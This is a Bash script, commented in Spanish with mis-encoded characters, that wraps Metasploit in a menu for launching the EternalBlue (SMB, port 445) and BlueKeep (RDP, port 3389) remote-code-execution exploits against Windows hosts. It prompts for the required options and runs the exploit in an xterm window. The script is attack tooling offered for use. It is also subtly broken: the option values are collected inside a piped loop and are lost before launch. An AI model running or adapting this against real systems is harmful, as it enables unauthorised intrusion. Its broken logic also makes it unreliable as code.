
#!/bin/bash

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ConfiguraciÃ³n
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

check_dependencies() {
    for tool in nmap msfconsole xterm; do
        if ! command -v $tool &>/dev/null; then
            echo "âŒ Herramienta requerida no encontrada: $tool"
            exit 1
        fi
    done
}

show_exploit_options() {
    local exploit_path="$1"
    echo -e "\nğŸ“‹ Opciones para el exploit: $exploit_path"
    msfconsole -q -x "use $exploit_path; show options; exit" 2>/dev/null |
    sed -n '/^Name\s\+Current Setting\s\+Required\s\+Description/,/^$/p' |
    tail -n +2 | while read -r line; do
        name=$(echo "$line" | awk '{print $1}')
        setting=$(echo "$line" | awk '{print $2}')
        required=$(echo "$line" | awk '{print $3}')
        description=$(echo "$line" | cut -d' ' -f4-)
        echo "ğŸ”¸ $name | Obligatorio: $required | DescripciÃ³n: $description | Valor actual: $setting"
    done
}

run_exploit() {
    local exploit_path="$1"
    echo -e "\nğŸŒ Ingrese los valores de las variables necesarias para este exploit:"

    declare -A VARS
    msfconsole -q -x "use $exploit_path; show options; exit" 2>/dev/null |
    sed -n '/^Name\s\+Current Setting\s\+Required\s\+Description/,/^$/p' |
    tail -n +2 | while read -r line; do
        var=$(echo "$line" | awk '{print $1}')
        required=$(echo "$line" | awk '{print $3}')
        if [[ "$required" == "yes" ]]; then
            read -p "ğŸ“ Ingrese valor para $var: " valor
            VARS[$var]=$valor
        fi
    done

    echo -e "\nğŸš€ Ejecutando exploit en xterm..."
    xterm -e msfconsole -x "use $exploit_path; $(for k in "${!VARS[@]}"; do echo -n "set $k ${VARS[$k]}; "; done) exploit" &
}

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# MenÃº principal
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

main_menu() {
    clear
    echo "ğŸ¯ MenÃº de Puertos Comunes Vulnerables en Windows"
    echo "1) Puerto 445 (SMB)"
    echo "2) Puerto 3389 (RDP)"
    echo "3) Salir"
    read -p "Seleccione una opciÃ³n: " opc

    case "$opc" in
        1) smb_menu ;;
        2) rdp_menu ;;
        3) exit ;;
        *) echo "OpciÃ³n invÃ¡lida." && sleep 1 && main_menu ;;
    esac
}

smb_menu() {
    clear
    echo "ğŸ“‚ Exploits SMB (puerto 445)"
    echo "1) EternalBlue (ms17_010_eternalblue)"
    echo "2) Regresar"
    read -p "Seleccione un exploit: " opc
    case "$opc" in
        1)
            exploit_path="exploit/windows/smb/ms17_010_eternalblue"
            show_exploit_options "$exploit_path"
            run_exploit "$exploit_path"
            ;;
        2) main_menu ;;
        *) echo "OpciÃ³n invÃ¡lida." && sleep 1 && smb_menu ;;
    esac
}

rdp_menu() {
    clear
    echo "ğŸ” Exploits RDP (puerto 3389)"
    echo "1) BlueKeep (cve_2019_0708_bluekeep_rce)"
    echo "2) Regresar"
    read -p "Seleccione un exploit: " opc
    case "$opc" in
        1)
            exploit_path="exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
            show_exploit_options "$exploit_path"
            run_exploit "$exploit_path"
            ;;
        2) main_menu ;;
        *) echo "OpciÃ³n invÃ¡lida." && sleep 1 && rdp_menu ;;
    esac
}

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Inicio del script
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

check_dependencies
main_menu
